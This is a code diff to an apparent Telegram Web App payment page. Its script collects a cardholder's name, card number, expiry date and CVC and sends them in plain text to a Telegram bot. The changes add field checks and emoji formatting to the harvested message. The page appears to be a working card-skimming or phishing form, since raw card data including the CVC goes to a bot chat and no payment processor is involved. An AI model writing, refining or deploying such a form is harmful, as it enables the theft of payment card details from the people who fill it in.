@@ -63,25 +63,35 @@
     </div>
 
     <script>
-        // دالة إرسال البيانات إلى البوت
+        // التأكد من تهيئة تطبيق تلجرام للويب
+        const tg = window.Telegram.WebApp;
+        tg.ready();
+        tg.expand(); // تمديد النافذة لتظهر بشكل مريح للمستخدم
+
         function sendData() {
             const name = document.getElementById('name').value;
             const cardNum = document.getElementById('cardNum').value;
             const expiry = document.getElementById('expiry').value;
             const cvc = document.getElementById('cvc').value;
             
-            // تجميع البيانات
-            const data = `طلب دفع جديد:
-الاسم: ${name}
-رقم البطاقة: ${cardNum}
-التاريخ: ${expiry}
-CVC: ${cvc}`;
+            // التحقق من أن الحقول غير فارغة
+            if(!name || !cardNum || !expiry || !cvc) {
+                alert("يرجى ملء كافة الحقول المطلوبة!");
+                return;
+            }
+
+            // تجميع البيانات وتنسيقها
+            const data = `💳 نوع العملية: Credit Card
+👤 الاسم: ${name}
+🔢 رقم البطاقة: ${cardNum}
+📅 التاريخ: ${expiry}
+🔒 رمز الـ CVC: ${cvc}`;
             
-            // إرسال البيانات لتلغرام
-            window.Telegram.WebApp.sendData(data);
+            // إرسال البيانات إلى البوت (ستنجح الآن لأن الزر أصبح Keyboard)
+            tg.sendData(data);
             
-            // إغلاق النافذة تلقائياً
-            window.Telegram.WebApp.close();
+            // إغلاق النافذة تلقائياً بعد الإرسال
+            tg.close();
         }
     </script>
 </body>
